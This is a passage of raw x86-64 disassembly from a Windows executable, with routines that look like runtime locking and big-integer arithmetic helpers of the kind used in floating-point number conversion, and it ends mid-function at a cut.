   1400084a8:	8b 55 10             	mov    0x10(%rbp),%edx
   1400084ab:	48 89 d0             	mov    %rdx,%rax
   1400084ae:	48 c1 e0 02          	shl    $0x2,%rax
   1400084b2:	48 01 d0             	add    %rdx,%rax
   1400084b5:	48 c1 e0 03          	shl    $0x3,%rax
   1400084b9:	48 8d 15 00 8d 00 00 	lea    0x8d00(%rip),%rdx        # 0x1400111c0
   1400084c0:	48 01 d0             	add    %rdx,%rax
   1400084c3:	48 89 c1             	mov    %rax,%rcx
   1400084c6:	48 8b 05 93 9d 00 00 	mov    0x9d93(%rip),%rax        # 0x140012260
   1400084cd:	ff d0                	call   *%rax
   1400084cf:	e9 ea 00 00 00       	jmp    0x1400085be
   1400084d4:	8b 05 36 8d 00 00    	mov    0x8d36(%rip),%eax        # 0x140011210
   1400084da:	85 c0                	test   %eax,%eax
   1400084dc:	0f 85 9e 00 00 00    	jne    0x140008580
   1400084e2:	48 8d 05 27 8d 00 00 	lea    0x8d27(%rip),%rax        # 0x140011210
   1400084e9:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   1400084ed:	c7 45 ec 01 00 00 00 	movl   $0x1,-0x14(%rbp)
   1400084f4:	8b 55 ec             	mov    -0x14(%rbp),%edx
   1400084f7:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   1400084fb:	87 10                	xchg   %edx,(%rax)
   1400084fd:	89 d0                	mov    %edx,%eax
   1400084ff:	89 45 f8             	mov    %eax,-0x8(%rbp)
   140008502:	83 7d f8 00          	cmpl   $0x0,-0x8(%rbp)
   140008506:	75 58                	jne    0x140008560
   140008508:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
   14000850f:	eb 2e                	jmp    0x14000853f
   140008511:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140008514:	48 63 d0             	movslq %eax,%rdx
   140008517:	48 89 d0             	mov    %rdx,%rax
   14000851a:	48 c1 e0 02          	shl    $0x2,%rax
   14000851e:	48 01 d0             	add    %rdx,%rax
   140008521:	48 c1 e0 03          	shl    $0x3,%rax
   140008525:	48 8d 15 94 8c 00 00 	lea    0x8c94(%rip),%rdx        # 0x1400111c0
   14000852c:	48 01 d0             	add    %rdx,%rax
   14000852f:	48 89 c1             	mov    %rax,%rcx
   140008532:	48 8b 05 67 9d 00 00 	mov    0x9d67(%rip),%rax        # 0x1400122a0
   140008539:	ff d0                	call   *%rax
   14000853b:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
   14000853f:	83 7d fc 01          	cmpl   $0x1,-0x4(%rbp)
   140008543:	7e cc                	jle    0x140008511
   140008545:	48 8d 05 d4 fe ff ff 	lea    -0x12c(%rip),%rax        # 0x140008420
   14000854c:	48 89 c1             	mov    %rax,%rcx
   14000854f:	e8 2a 90 ff ff       	call   0x14000157e
   140008554:	c7 05 b2 8c 00 00 02 	movl   $0x2,0x8cb2(%rip)        # 0x140011210
   14000855b:	00 00 00 
   14000855e:	eb 20                	jmp    0x140008580
   140008560:	83 7d f8 02          	cmpl   $0x2,-0x8(%rbp)
   140008564:	75 1a                	jne    0x140008580
   140008566:	c7 05 a0 8c 00 00 02 	movl   $0x2,0x8ca0(%rip)        # 0x140011210
   14000856d:	00 00 00 
   140008570:	eb 0e                	jmp    0x140008580
   140008572:	b9 01 00 00 00       	mov    $0x1,%ecx
   140008577:	48 8b 05 5a 9d 00 00 	mov    0x9d5a(%rip),%rax        # 0x1400122d8
   14000857e:	ff d0                	call   *%rax
   140008580:	8b 05 8a 8c 00 00    	mov    0x8c8a(%rip),%eax        # 0x140011210
   140008586:	83 f8 01             	cmp    $0x1,%eax
   140008589:	74 e7                	je     0x140008572
   14000858b:	8b 05 7f 8c 00 00    	mov    0x8c7f(%rip),%eax        # 0x140011210
   140008591:	83 f8 02             	cmp    $0x2,%eax
   140008594:	75 28                	jne    0x1400085be
   140008596:	8b 55 10             	mov    0x10(%rbp),%edx
   140008599:	48 89 d0             	mov    %rdx,%rax
   14000859c:	48 c1 e0 02          	shl    $0x2,%rax
   1400085a0:	48 01 d0             	add    %rdx,%rax
   1400085a3:	48 c1 e0 03          	shl    $0x3,%rax
   1400085a7:	48 8d 15 12 8c 00 00 	lea    0x8c12(%rip),%rdx        # 0x1400111c0
   1400085ae:	48 01 d0             	add    %rdx,%rax
   1400085b1:	48 89 c1             	mov    %rax,%rcx
   1400085b4:	48 8b 05 a5 9c 00 00 	mov    0x9ca5(%rip),%rax        # 0x140012260
   1400085bb:	ff d0                	call   *%rax
   1400085bd:	90                   	nop
   1400085be:	48 83 c4 40          	add    $0x40,%rsp
   1400085c2:	5d                   	pop    %rbp
   1400085c3:	c3                   	ret
   1400085c4:	55                   	push   %rbp
   1400085c5:	48 89 e5             	mov    %rsp,%rbp
   1400085c8:	48 83 ec 20          	sub    $0x20,%rsp
   1400085cc:	89 4d 10             	mov    %ecx,0x10(%rbp)
   1400085cf:	8b 05 3b 8c 00 00    	mov    0x8c3b(%rip),%eax        # 0x140011210
   1400085d5:	83 f8 02             	cmp    $0x2,%eax
   1400085d8:	75 27                	jne    0x140008601
   1400085da:	8b 55 10             	mov    0x10(%rbp),%edx
   1400085dd:	48 89 d0             	mov    %rdx,%rax
   1400085e0:	48 c1 e0 02          	shl    $0x2,%rax
   1400085e4:	48 01 d0             	add    %rdx,%rax
   1400085e7:	48 c1 e0 03          	shl    $0x3,%rax
   1400085eb:	48 8d 15 ce 8b 00 00 	lea    0x8bce(%rip),%rdx        # 0x1400111c0
   1400085f2:	48 01 d0             	add    %rdx,%rax
   1400085f5:	48 89 c1             	mov    %rax,%rcx
   1400085f8:	48 8b 05 b1 9c 00 00 	mov    0x9cb1(%rip),%rax        # 0x1400122b0
   1400085ff:	ff d0                	call   *%rax
   140008601:	90                   	nop
   140008602:	48 83 c4 20          	add    $0x20,%rsp
   140008606:	5d                   	pop    %rbp
   140008607:	c3                   	ret
   140008608:	55                   	push   %rbp
   140008609:	48 89 e5             	mov    %rsp,%rbp
   14000860c:	48 83 ec 10          	sub    $0x10,%rsp
   140008610:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   140008614:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140008618:	8b 00                	mov    (%rax),%eax
   14000861a:	f3 0f bc c0          	tzcnt  %eax,%eax
   14000861e:	89 45 fc             	mov    %eax,-0x4(%rbp)
   140008621:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140008625:	8b 10                	mov    (%rax),%edx
   140008627:	8b 45 fc             	mov    -0x4(%rbp),%eax
   14000862a:	89 c1                	mov    %eax,%ecx
   14000862c:	d3 ea                	shr    %cl,%edx
   14000862e:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140008632:	89 10                	mov    %edx,(%rax)
   140008634:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140008637:	48 83 c4 10          	add    $0x10,%rsp
   14000863b:	5d                   	pop    %rbp
   14000863c:	c3                   	ret
   14000863d:	55                   	push   %rbp
   14000863e:	48 89 e5             	mov    %rsp,%rbp
   140008641:	89 4d 10             	mov    %ecx,0x10(%rbp)
   140008644:	0f bd 45 10          	bsr    0x10(%rbp),%eax
   140008648:	83 f0 1f             	xor    $0x1f,%eax
   14000864b:	5d                   	pop    %rbp
   14000864c:	c3                   	ret
   14000864d:	55                   	push   %rbp
   14000864e:	48 89 e5             	mov    %rsp,%rbp
   140008651:	48 83 ec 30          	sub    $0x30,%rsp
   140008655:	89 4d 10             	mov    %ecx,0x10(%rbp)
   140008658:	b9 00 00 00 00       	mov    $0x0,%ecx
   14000865d:	e8 30 fe ff ff       	call   0x140008492
   140008662:	83 7d 10 09          	cmpl   $0x9,0x10(%rbp)
   140008666:	7f 48                	jg     0x1400086b0
   140008668:	8b 45 10             	mov    0x10(%rbp),%eax
   14000866b:	48 98                	cltq
   14000866d:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
   140008674:	00 
   140008675:	48 8d 05 a4 8b 00 00 	lea    0x8ba4(%rip),%rax        # 0x140011220
   14000867c:	48 8b 04 02          	mov    (%rdx,%rax,1),%rax
   140008680:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140008684:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
   140008689:	74 25                	je     0x1400086b0
   14000868b:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   14000868f:	48 8b 00             	mov    (%rax),%rax
   140008692:	8b 55 10             	mov    0x10(%rbp),%edx
   140008695:	48 63 d2             	movslq %edx,%rdx
   140008698:	48 8d 0c d5 00 00 00 	lea    0x0(,%rdx,8),%rcx
   14000869f:	00 
   1400086a0:	48 8d 15 79 8b 00 00 	lea    0x8b79(%rip),%rdx        # 0x140011220
   1400086a7:	48 89 04 11          	mov    %rax,(%rcx,%rdx,1)
   1400086ab:	e9 b1 00 00 00       	jmp    0x140008761
   1400086b0:	8b 45 10             	mov    0x10(%rbp),%eax
   1400086b3:	ba 01 00 00 00       	mov    $0x1,%edx
   1400086b8:	89 c1                	mov    %eax,%ecx
   1400086ba:	d3 e2                	shl    %cl,%edx
   1400086bc:	89 d0                	mov    %edx,%eax
   1400086be:	89 45 f4             	mov    %eax,-0xc(%rbp)
   1400086c1:	8b 45 f4             	mov    -0xc(%rbp),%eax
   1400086c4:	83 e8 01             	sub    $0x1,%eax
   1400086c7:	48 98                	cltq
   1400086c9:	48 c1 e0 02          	shl    $0x2,%rax
   1400086cd:	48 83 c0 27          	add    $0x27,%rax
   1400086d1:	48 c1 e8 03          	shr    $0x3,%rax
   1400086d5:	89 45 f0             	mov    %eax,-0x10(%rbp)
   1400086d8:	83 7d 10 09          	cmpl   $0x9,0x10(%rbp)
   1400086dc:	7f 4e                	jg     0x14000872c
   1400086de:	48 8b 15 ab 29 00 00 	mov    0x29ab(%rip),%rdx        # 0x14000b090
   1400086e5:	48 8d 05 94 8b 00 00 	lea    0x8b94(%rip),%rax        # 0x140011280
   1400086ec:	48 29 c2             	sub    %rax,%rdx
   1400086ef:	48 89 d0             	mov    %rdx,%rax
   1400086f2:	48 c1 f8 03          	sar    $0x3,%rax
   1400086f6:	48 89 c2             	mov    %rax,%rdx
   1400086f9:	8b 45 f0             	mov    -0x10(%rbp),%eax
   1400086fc:	48 01 d0             	add    %rdx,%rax
   1400086ff:	48 3d 20 01 00 00    	cmp    $0x120,%rax
   140008705:	77 25                	ja     0x14000872c
   140008707:	48 8b 05 82 29 00 00 	mov    0x2982(%rip),%rax        # 0x14000b090
   14000870e:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140008712:	48 8b 05 77 29 00 00 	mov    0x2977(%rip),%rax        # 0x14000b090
   140008719:	8b 55 f0             	mov    -0x10(%rbp),%edx
   14000871c:	48 c1 e2 03          	shl    $0x3,%rdx
   140008720:	48 01 d0             	add    %rdx,%rax
   140008723:	48 89 05 66 29 00 00 	mov    %rax,0x2966(%rip)        # 0x14000b090
   14000872a:	eb 21                	jmp    0x14000874d
   14000872c:	8b 45 f0             	mov    -0x10(%rbp),%eax
   14000872f:	48 c1 e0 03          	shl    $0x3,%rax
   140008733:	48 89 c1             	mov    %rax,%rcx
   140008736:	e8 b5 19 00 00       	call   0x14000a0f0
   14000873b:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   14000873f:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
   140008744:	75 07                	jne    0x14000874d
   140008746:	b8 00 00 00 00       	mov    $0x0,%eax
   14000874b:	eb 3b                	jmp    0x140008788
   14000874d:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140008751:	8b 55 10             	mov    0x10(%rbp),%edx
   140008754:	89 50 08             	mov    %edx,0x8(%rax)
   140008757:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   14000875b:	8b 55 f4             	mov    -0xc(%rbp),%edx
   14000875e:	89 50 0c             	mov    %edx,0xc(%rax)
   140008761:	b9 00 00 00 00       	mov    $0x0,%ecx
   140008766:	e8 59 fe ff ff       	call   0x1400085c4
   14000876b:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   14000876f:	c7 40 14 00 00 00 00 	movl   $0x0,0x14(%rax)
   140008776:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   14000877a:	8b 50 14             	mov    0x14(%rax),%edx
   14000877d:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140008781:	89 50 10             	mov    %edx,0x10(%rax)
   140008784:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140008788:	48 83 c4 30          	add    $0x30,%rsp
   14000878c:	5d                   	pop    %rbp
   14000878d:	c3                   	ret
   14000878e:	55                   	push   %rbp
   14000878f:	48 89 e5             	mov    %rsp,%rbp
   140008792:	48 83 ec 20          	sub    $0x20,%rsp
   140008796:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   14000879a:	48 83 7d 10 00       	cmpq   $0x0,0x10(%rbp)
   14000879f:	74 71                	je     0x140008812
   1400087a1:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400087a5:	8b 40 08             	mov    0x8(%rax),%eax
   1400087a8:	83 f8 09             	cmp    $0x9,%eax
   1400087ab:	7e 0e                	jle    0x1400087bb
   1400087ad:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400087b1:	48 89 c1             	mov    %rax,%rcx
   1400087b4:	e8 1f 19 00 00       	call   0x14000a0d8
   1400087b9:	eb 57                	jmp    0x140008812
   1400087bb:	b9 00 00 00 00       	mov    $0x0,%ecx
   1400087c0:	e8 cd fc ff ff       	call   0x140008492
   1400087c5:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400087c9:	8b 40 08             	mov    0x8(%rax),%eax
   1400087cc:	48 98                	cltq
   1400087ce:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
   1400087d5:	00 
   1400087d6:	48 8d 05 43 8a 00 00 	lea    0x8a43(%rip),%rax        # 0x140011220
   1400087dd:	48 8b 14 02          	mov    (%rdx,%rax,1),%rdx
   1400087e1:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400087e5:	48 89 10             	mov    %rdx,(%rax)
   1400087e8:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400087ec:	8b 40 08             	mov    0x8(%rax),%eax
   1400087ef:	48 98                	cltq
   1400087f1:	48 8d 0c c5 00 00 00 	lea    0x0(,%rax,8),%rcx
   1400087f8:	00 
   1400087f9:	48 8d 15 20 8a 00 00 	lea    0x8a20(%rip),%rdx        # 0x140011220
   140008800:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140008804:	48 89 04 11          	mov    %rax,(%rcx,%rdx,1)
   140008808:	b9 00 00 00 00       	mov    $0x0,%ecx
   14000880d:	e8 b2 fd ff ff       	call   0x1400085c4
   140008812:	90                   	nop
   140008813:	48 83 c4 20          	add    $0x20,%rsp
   140008817:	5d                   	pop    %rbp
   140008818:	c3                   	ret
   140008819:	55                   	push   %rbp
   14000881a:	48 89 e5             	mov    %rsp,%rbp
   14000881d:	48 83 ec 50          	sub    $0x50,%rsp
   140008821:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   140008825:	89 55 18             	mov    %edx,0x18(%rbp)
   140008828:	44 89 45 20          	mov    %r8d,0x20(%rbp)
   14000882c:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140008830:	8b 40 14             	mov    0x14(%rax),%eax
   140008833:	89 45 e4             	mov    %eax,-0x1c(%rbp)
   140008836:	48 8b 45 10          	mov    0x10(%rbp),%rax
   14000883a:	48 83 c0 18          	add    $0x18,%rax
   14000883e:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140008842:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
   140008849:	8b 45 20             	mov    0x20(%rbp),%eax
   14000884c:	48 98                	cltq
   14000884e:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140008852:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140008856:	8b 00                	mov    (%rax),%eax
   140008858:	89 c2                	mov    %eax,%edx
   14000885a:	8b 45 18             	mov    0x18(%rbp),%eax
   14000885d:	48 98                	cltq
   14000885f:	48 0f af d0          	imul   %rax,%rdx
   140008863:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140008867:	48 01 d0             	add    %rdx,%rax
   14000886a:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
   14000886e:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140008872:	48 c1 e8 20          	shr    $0x20,%rax
   140008876:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   14000887a:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   14000887e:	48 8d 50 04          	lea    0x4(%rax),%rdx
   140008882:	48 89 55 f0          	mov    %rdx,-0x10(%rbp)
   140008886:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
   14000888a:	89 10                	mov    %edx,(%rax)
   14000888c:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
   140008890:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140008893:	3b 45 e4             	cmp    -0x1c(%rbp),%eax
   140008896:	7c ba                	jl     0x140008852
   140008898:	48 83 7d e8 00       	cmpq   $0x0,-0x18(%rbp)
   14000889d:	0f 84 9a 00 00 00    	je     0x14000893d
   1400088a3:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400088a7:	8b 40 0c             	mov    0xc(%rax),%eax
   1400088aa:	39 45 e4             	cmp    %eax,-0x1c(%rbp)
   1400088ad:	7c 67                	jl     0x140008916
   1400088af:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400088b3:	8b 40 08             	mov    0x8(%rax),%eax
   1400088b6:	83 c0 01             	add    $0x1,%eax
   1400088b9:	89 c1                	mov    %eax,%ecx
   1400088bb:	e8 8d fd ff ff       	call   0x14000864d
   1400088c0:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
   1400088c4:	48 83 7d d0 00       	cmpq   $0x0,-0x30(%rbp)
   1400088c9:	75 07                	jne    0x1400088d2
   1400088cb:	b8 00 00 00 00       	mov    $0x0,%eax
   1400088d0:	eb 6f                	jmp    0x140008941
   1400088d2:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400088d6:	8b 40 14             	mov    0x14(%rax),%eax
   1400088d9:	48 98                	cltq
   1400088db:	48 83 c0 02          	add    $0x2,%rax
   1400088df:	48 8d 0c 85 00 00 00 	lea    0x0(,%rax,4),%rcx
   1400088e6:	00 
   1400088e7:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400088eb:	48 8d 50 10          	lea    0x10(%rax),%rdx
   1400088ef:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
   1400088f3:	48 83 c0 10          	add    $0x10,%rax
   1400088f7:	49 89 c8             	mov    %rcx,%r8
   1400088fa:	48 89 c1             	mov    %rax,%rcx
   1400088fd:	e8 f6 17 00 00       	call   0x14000a0f8
   140008902:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140008906:	48 89 c1             	mov    %rax,%rcx
   140008909:	e8 80 fe ff ff       	call   0x14000878e
   14000890e:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
   140008912:	48 89 45 10          	mov    %rax,0x10(%rbp)
   140008916:	8b 45 e4             	mov    -0x1c(%rbp),%eax
   140008919:	8d 50 01             	lea    0x1(%rax),%edx
   14000891c:	89 55 e4             	mov    %edx,-0x1c(%rbp)
   14000891f:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
   140008923:	89 d1                	mov    %edx,%ecx
   140008925:	48 8b 55 10          	mov    0x10(%rbp),%rdx
   140008929:	48 98                	cltq
   14000892b:	48 83 c0 04          	add    $0x4,%rax
   14000892f:	89 4c 82 08          	mov    %ecx,0x8(%rdx,%rax,4)
   140008933:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140008937:	8b 55 e4             	mov    -0x1c(%rbp),%edx
   14000893a:	89 50 14             	mov    %edx,0x14(%rax)
   14000893d:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140008941:	48 83 c4 50          	add    $0x50,%rsp
   140008945:	5d                   	pop    %rbp
   140008946:	c3                   	ret
   140008947:	55                   	push   %rbp
   140008948:	48 89 e5             	mov    %rsp,%rbp
   14000894b:	48 83 ec 30          	sub    $0x30,%rsp
   14000894f:	89 4d 10             	mov    %ecx,0x10(%rbp)
   140008952:	b9 01 00 00 00       	mov    $0x1,%ecx
   140008957:	e8 f1 fc ff ff       	call   0x14000864d
   14000895c:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140008960:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
   140008965:	75 07                	jne    0x14000896e
   140008967:	b8 00 00 00 00       	mov    $0x0,%eax
   14000896c:	eb 19                	jmp    0x140008987
   14000896e:	8b 55 10             	mov    0x10(%rbp),%edx
   140008971:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140008975:	89 50 18             	mov    %edx,0x18(%rax)
   140008978:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   14000897c:	c7 40 14 01 00 00 00 	movl   $0x1,0x14(%rax)
   140008983:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
   140008987:	48 83 c4 30          	add    $0x30,%rsp
   14000898b:	5d                   	pop    %rbp
   14000898c:	c3                   	ret
   14000898d:	55                   	push   %rbp
   14000898e:	48 89 e5             	mov    %rsp,%rbp
   140008991:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   140008998:	48 89 4d 10          	mov    %rcx,0x10(%rbp)
   14000899c:	48 89 55 18          	mov    %rdx,0x18(%rbp)
   1400089a0:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400089a4:	8b 50 14             	mov    0x14(%rax),%edx
   1400089a7:	48 8b 45 18          	mov    0x18(%rbp),%rax
   1400089ab:	8b 40 14             	mov    0x14(%rax),%eax
   1400089ae:	39 c2                	cmp    %eax,%edx
   1400089b0:	7d 18                	jge    0x1400089ca
   1400089b2:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400089b6:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
   1400089ba:	48 8b 45 18          	mov    0x18(%rbp),%rax
   1400089be:	48 89 45 10          	mov    %rax,0x10(%rbp)
   1400089c2:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
   1400089c6:	48 89 45 18          	mov    %rax,0x18(%rbp)
   1400089ca:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400089ce:	8b 40 08             	mov    0x8(%rax),%eax
   1400089d1:	89 45 fc             	mov    %eax,-0x4(%rbp)
   1400089d4:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400089d8:	8b 40 14             	mov    0x14(%rax),%eax
   1400089db:	89 45 c4             	mov    %eax,-0x3c(%rbp)
   1400089de:	48 8b 45 18          	mov    0x18(%rbp),%rax
   1400089e2:	8b 40 14             	mov    0x14(%rax),%eax
   1400089e5:	89 45 c0             	mov    %eax,-0x40(%rbp)
   1400089e8:	8b 55 c4             	mov    -0x3c(%rbp),%edx
   1400089eb:	8b 45 c0             	mov    -0x40(%rbp),%eax
   1400089ee:	01 d0                	add    %edx,%eax
   1400089f0:	89 45 f8             	mov    %eax,-0x8(%rbp)
   1400089f3:	48 8b 45 10          	mov    0x10(%rbp),%rax
   1400089f7:	8b 40 0c             	mov    0xc(%rax),%eax
   1400089fa:	39 45 f8             	cmp    %eax,-0x8(%rbp)
   1400089fd:	7e 04                	jle    0x140008a03
   1400089ff:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
   140008a03:	8b 45 fc             	mov    -0x4(%rbp),%eax
   140008a06:	89 c1                	mov    %eax,%ecx
   140008a08:	e8 40 fc ff ff       	call   0x14000864d
   140008a0d:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
   140008a11:	48 83 7d c8 00       	cmpq   $0x0,-0x38(%rbp)
   140008a16:	75 0a                	jne    0x140008a22
   140008a18:	b8 00 00 00 00       	mov    $0x0,%eax
   140008a1d:	e9 88 01 00 00       	jmp    0x140008baa
   140008a22:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
   140008a26:	48 83 c0 18          	add    $0x18,%rax
   140008a2a:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140008a2e:	8b 45 f8             	mov    -0x8(%rbp),%eax
   140008a31:	48 98                	cltq
   140008a33:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
   140008a3a:	00 
   140008a3b:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140008a3f:	48 01 d0             	add    %rdx,%rax
   140008a42:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
   140008a46:	eb 0f                	jmp    0x140008a57
   140008a48:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140008a4c:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   140008a52:	48 83 45 f0 04       	addq   $0x4,-0x10(%rbp)
   140008a57:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140008a5b:	48 3b 45 b8          	cmp    -0x48(%rbp),%rax
   140008a5f:	72 e7                	jb     0x140008a48
   140008a61:	48 8b 45 10          	mov    0x10(%rbp),%rax
   140008a65:	48 83 c0 18          	add    $0x18,%rax
   140008a69:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
   140008a6d:	8b 45 c4             	mov    -0x3c(%rbp),%eax
   140008a70:	48 98                	cltq
   140008a72:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
   140008a79:	00 
   140008a7a:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
   140008a7e:	48 01 d0             	add    %rdx,%rax
   140008a81:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
   140008a85:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140008a89:	48 83 c0 18          	add    $0x18,%rax
   140008a8d:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140008a91:	8b 45 c0             	mov    -0x40(%rbp),%eax
   140008a94:	48 98                	cltq
   140008a96:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
   140008a9d:	00 
   140008a9e:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140008aa2:	48 01 d0             	add    %rdx,%rax
   140008aa5:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
   140008aa9:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
   140008aad:	48 83 c0 18          	add    $0x18,%rax
   140008ab1:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
   140008ab5:	e9 95 00 00 00       	jmp    0x140008b4f
   140008aba:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140008abe:	48 8d 50 04          	lea    0x4(%rax),%rdx
   140008ac2:	48 89 55 e8          	mov    %rdx,-0x18(%rbp)
   140008ac6:	8b 00                	mov    (%rax),%eax
   140008ac8:	89 45 a4             	mov    %eax,-0x5c(%rbp)
   140008acb:	83 7d a4 00          	cmpl   $0x0,-0x5c(%rbp)
   140008acf:	74 79                	je     0x140008b4a
   140008ad1:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
   140008ad5:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140008ad9:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
   140008add:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   140008ae1:	48 c7 45 d0 00 00 00 	movq   $0x0,-0x30(%rbp)
   140008ae8:	00 
   140008ae9:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140008aed:	48 8d 50 04          	lea    0x4(%rax),%rdx
   140008af1:	48 89 55 f0          	mov    %rdx,-0x10(%rbp)
   140008af5:	8b 00                	mov    (%rax),%eax
   140008af7:	89 c2                	mov    %eax,%edx
   140008af9:	8b 45 a4             	mov    -0x5c(%rbp),%eax
   140008afc:	48 0f af d0          	imul   %rax,%rdx
   140008b00:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   140008b04:	8b 00                	mov    (%rax),%eax
   140008b06:	89 c0                	mov    %eax,%eax
   140008b08:	48 01 c2             	add    %rax,%rdx
   140008b0b:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
   140008b0f:	48 01 d0             	add    %rdx,%rax
   140008b12:	48 89 45 98          	mov    %rax,-0x68(%rbp)
   140008b16:	48 8b 45 98          	mov    -0x68(%rbp),%rax
   140008b1a:	48 c1 e8 20          	shr    $0x20,%rax
   140008b1e:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
   140008b22:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   140008b26:	48 8d 50 04          	lea    0x4(%rax),%rdx
   140008b2a:	48 89 55 e0          	mov    %rdx,-0x20(%rbp)
   140008b2e:	48 8b 55 98          	mov    -0x68(%rbp),%rdx
   140008b32:	89 10                	mov    %edx,(%rax)
   140008b34:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140008b38:	48 3b 45 b0          	cmp    -0x50(%rbp),%rax
   140008b3c:	72 ab                	jb     0x140008ae9
   140008b3e:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
   140008b42:	89 c2                	mov    %eax,%edx
   140008b44:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   140008b48:	89 10                	mov    %edx,(%rax)
   140008b4a:	48 83 45 d8 04       	addq   $0x4,-0x28(%rbp)
   140008b4f:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
   140008b53:	48 3b 45 a8          	cmp    -0x58(%rbp),%rax
   140008b57:	0f 82 5d ff ff ff    	jb     0x140008aba
   140008b5d:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
   140008b61:	48 83 c0 18          	add    $0x18,%rax
   140008b65:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
   140008b69:	8b 45 f8             	mov    -0x8(%rbp),%eax
   140008b6c:	48 98                	cltq
   140008b6e:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
   140008b75:	00 
